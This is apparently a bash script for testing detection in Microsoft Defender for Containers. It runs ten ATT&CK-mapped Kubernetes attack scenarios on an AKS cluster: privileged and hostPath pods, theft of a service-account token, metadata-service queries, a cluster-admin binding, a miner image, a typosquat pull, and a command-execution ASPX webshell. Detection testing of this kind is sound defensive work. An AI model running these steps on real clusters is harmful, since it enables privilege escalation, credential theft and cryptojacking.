#!/usr/bin/env bash
# Defender for Containers — scenarios S-K8S-01..10
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/lib/common.sh"
confirm_safe

ensure_kubectl() {
  have kubectl || { err "kubectl not installed"; exit 1; }
  [[ -n "$AKS_CLUSTER" ]] || { err "AKS_CLUSTER not set"; exit 1; }
  az aks get-credentials -g "$RG_SERVERS" -n "$AKS_CLUSTER" --overwrite-existing >/dev/null
}

# Scenario: 01 — Privileged pod                            [T1611]
s01() {
  scenario_header S-K8S-01 "Create privileged pod" T1611
  ensure_kubectl
  kubectl delete pod pwn-priv --ignore-not-found
  kubectl run pwn-priv --image=ubuntu:22.04 --privileged --restart=Never -- sleep 1d
  ok "Pod pwn-priv created."
}

# Scenario: 02 — hostPath root mount                       [T1610/T1611]
s02() {
  scenario_header S-K8S-02 "Pod with hostPath: /" T1611
  ensure_kubectl
  kubectl delete pod pwn-hostpath --ignore-not-found
  kubectl apply -f - <<'YAML'
apiVersion: v1
kind: Pod
metadata: { name: pwn-hostpath, labels: { poc-mdc-simulator: "true" } }
spec:
  containers:
  - name: c
    image: alpine
    command: ["sleep","1d"]
    volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
  - name: host
    hostPath: { path: / }
YAML
  ok "Pod pwn-hostpath applied."
}

# Scenario: 03 — kubectl exec                              [T1609]
s03() {
  scenario_header S-K8S-03 "kubectl exec into pod" T1609
  ensure_kubectl
  kubectl get pod pwn-priv >/dev/null 2>&1 || kubectl run pwn-priv --image=ubuntu:22.04 --restart=Never -- sleep 1d
  kubectl wait --for=condition=Ready pod/pwn-priv --timeout=60s
  kubectl exec pwn-priv -- /bin/bash -c "whoami && id && uname -a"
  ok "Exec performed."
}

# Scenario: 04 — Crypto-miner image                        [T1496]
s04() {
  scenario_header S-K8S-04 "Deploy known miner image" T1496
  ensure_kubectl
  kubectl delete pod miner --ignore-not-found
  kubectl run miner --image=docker.io/kannix/monero-miner:latest --restart=Never \
    --overrides='{"spec":{"containers":[{"name":"miner","image":"docker.io/kannix/monero-miner:latest","resources":{"limits":{"cpu":"100m","memory":"128Mi"}}}]}}' \
    --labels=poc-mdc-simulator=true
  ok "Miner pod created."
}

# Scenario: 05 — Anonymous K8s API                          [T1078]
s05() {
  scenario_header S-K8S-05 "Anonymous access to apiserver" T1078
  ensure_kubectl
  local apisrv
  apisrv="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')"
  curl -sk "$apisrv/api/v1/namespaces/default/pods" | head -c 400 || true
  echo
  ok "Anonymous call attempted (should be rejected — but the attempt is logged)."
}

# Scenario: 06 — SA token misuse                            [T1552.005]
s06() {
  scenario_header S-K8S-06 "Use SA token from inside pod" T1552.005
  ensure_kubectl
  kubectl get pod pwn-priv >/dev/null 2>&1 || kubectl run pwn-priv --image=ubuntu:22.04 --restart=Never -- sleep 1d
  kubectl wait --for=condition=Ready pod/pwn-priv --timeout=60s
  kubectl exec pwn-priv -- /bin/bash -c '
    apt-get update -qq >/dev/null && apt-get install -y curl -qq >/dev/null || true;
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
    curl -skf -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/secrets | head -c 200 || echo "rejected (expected)"' || true
  ok "SA token call attempted."
}

# Scenario: 07 — Pull from typosquat registry              [T1525]
s07() {
  scenario_header S-K8S-07 "Pull from typosquat image" T1525
  ensure_kubectl
  kubectl delete pod sus-typosquat --ignore-not-found
  kubectl run sus-typosquat --image=docker.io/kuberntesio/pause:3.5 --restart=Never \
    --labels=poc-mdc-simulator=true || true
  ok "Typosquat image pull attempted."
}

# Scenario: 08 — Bind default SA to cluster-admin          [T1078]
s08() {
  scenario_header S-K8S-08 "Bind default SA to cluster-admin" T1078
  ensure_kubectl
  kubectl delete clusterrolebinding pwn-cra --ignore-not-found
  kubectl create clusterrolebinding pwn-cra \
    --clusterrole=cluster-admin \
    --serviceaccount=default:default
  kubectl annotate clusterrolebinding pwn-cra poc-mdc-simulator=true --overwrite
  warn "Cleanup in 10s"; sleep 10
  kubectl delete clusterrolebinding pwn-cra
  ok "Privileged binding created & removed."
}

# Scenario: 09 — IMDS from pod                              [T1552.005]
s09() {
  scenario_header S-K8S-09 "Access cloud IMDS from pod" T1552.005
  ensure_kubectl
  kubectl get pod pwn-priv >/dev/null 2>&1 || kubectl run pwn-priv --image=ubuntu:22.04 --restart=Never --privileged -- sleep 1d
  kubectl wait --for=condition=Ready pod/pwn-priv --timeout=60s
  kubectl exec pwn-priv -- /bin/bash -c '
    apt-get update -qq >/dev/null && apt-get install -y curl -qq >/dev/null || true;
    curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 300; echo' || true
  ok "IMDS access attempted from pod."
}

# Scenario: 10 — Webshell into nginx pod                    [T1505.003]
s10() {
  scenario_header S-K8S-10 "Drop webshell in nginx pod" T1505.003
  ensure_kubectl
  kubectl delete pod web --ignore-not-found
  kubectl run web --image=nginx --restart=Never --labels=poc-mdc-simulator=true
  kubectl wait --for=condition=Ready pod/web --timeout=60s
  cat > /tmp/diag.aspx <<'A'
<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]).Id); %>
A
  kubectl cp /tmp/diag.aspx web:/usr/share/nginx/html/diag.aspx
  rm -f /tmp/diag.aspx
  ok "Webshell copied into nginx pod."
}

dispatch "${1:?scenario number required (01..10)}"
